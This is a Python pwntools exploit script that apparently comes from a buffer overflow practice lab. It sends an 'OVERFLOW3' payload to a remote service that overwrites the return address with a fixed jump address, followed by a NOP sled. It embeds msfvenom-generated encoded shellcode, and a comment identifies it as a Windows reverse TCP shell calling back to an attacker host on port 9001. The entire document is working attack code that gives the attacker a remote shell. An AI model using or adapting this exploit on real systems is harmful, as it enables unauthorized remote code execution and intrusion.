#!/usr/bin/env python3

from pwn import *

host = "10.10.249.243"
port = 1337

s = remote(host, port)
total_length = 2000
offset = 1274
new_eip = p32(0x62501203)
nop = b"\x90"
buf =  b""
buf += b"\xfc\xbb\x6c\xda\x8f\x4a\xeb\x0c\x5e\x56\x31\x1e\xad"
buf += b"\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x90"
buf += b"\x32\x0d\x4a\x68\xc3\x72\xc2\x8d\xf2\xb2\xb0\xc6\xa5"
buf += b"\x02\xb2\x8a\x49\xe8\x96\x3e\xd9\x9c\x3e\x31\x6a\x2a"
buf += b"\x19\x7c\x6b\x07\x59\x1f\xef\x5a\x8e\xff\xce\x94\xc3"
buf += b"\xfe\x17\xc8\x2e\x52\xcf\x86\x9d\x42\x64\xd2\x1d\xe9"
buf += b"\x36\xf2\x25\x0e\x8e\xf5\x04\x81\x84\xaf\x86\x20\x48"
buf += b"\xc4\x8e\x3a\x8d\xe1\x59\xb1\x65\x9d\x5b\x13\xb4\x5e"
buf += b"\xf7\x5a\x78\xad\x09\x9b\xbf\x4e\x7c\xd5\xc3\xf3\x87"
buf += b"\x22\xb9\x2f\x0d\xb0\x19\xbb\xb5\x1c\x9b\x68\x23\xd7"
buf += b"\x97\xc5\x27\xbf\xbb\xd8\xe4\xb4\xc0\x51\x0b\x1a\x41"
buf += b"\x21\x28\xbe\x09\xf1\x51\xe7\xf7\x54\x6d\xf7\x57\x08"
buf += b"\xcb\x7c\x75\x5d\x66\xdf\x12\x92\x4b\xdf\xe2\xbc\xdc"
buf += b"\xac\xd0\x63\x77\x3a\x59\xeb\x51\xbd\x9e\xc6\x26\x51"
buf += b"\x61\xe9\x56\x78\xa6\xbd\x06\x12\x0f\xbe\xcc\xe2\xb0"
buf += b"\x6b\x42\xb2\x1e\xc4\x23\x62\xdf\xb4\xcb\x68\xd0\xeb"
buf += b"\xec\x93\x3a\x84\x87\x6e\xad\xa1\x46\x7b\x31\xde\x6a"
buf += b"\x7b\x6a\x37\xe2\x9d\x06\x57\xa2\x36\xbf\xce\xef\xcc"
buf += b"\x5e\x0e\x3a\xa9\x61\x84\xc9\x4e\x2f\x6d\xa7\x5c\xd8"
buf += b"\x9d\xf2\x3e\x4f\xa1\x28\x56\x13\x30\xb7\xa6\x5a\x29"
buf += b"\x60\xf1\x0b\x9f\x79\x97\xa1\x86\xd3\x85\x3b\x5e\x1b"
buf += b"\x0d\xe0\xa3\xa2\x8c\x65\x9f\x80\x9e\xb3\x20\x8d\xca"
buf += b"\x6b\x77\x5b\xa4\xcd\x21\x2d\x1e\x84\x9e\xe7\xf6\x51"
buf += b"\xed\x37\x80\x5d\x38\xce\x6c\xef\x95\x97\x93\xc0\x71"
buf += b"\x10\xec\x3c\xe2\xdf\x27\x85\x12\xaa\x65\xac\xba\x73"
buf += b"\xfc\xec\xa6\x83\x2b\x32\xdf\x07\xd9\xcb\x24\x17\xa8"
buf += b"\xce\x61\x9f\x41\xa3\xfa\x4a\x65\x10\xfa\x5e\x65\x96"
buf += b"\x04\x61"

shellcode = buf #msfvenom -p windows/shell_reverse_tcp LHOST=10.17.11.28 LPORT=9001 -b "\x00\x11\x40\x5f\xb8\xee" -f py

payload = [
    b"OVERFLOW3 ",
    b"A" * offset,
    new_eip,
    nop * 10,
    shellcode,
    b"C" * (total_length - offset - len(new_eip) - len(nop) - len(shellcode))
]

payload = b"".join(payload)
s.send(payload)
s.close()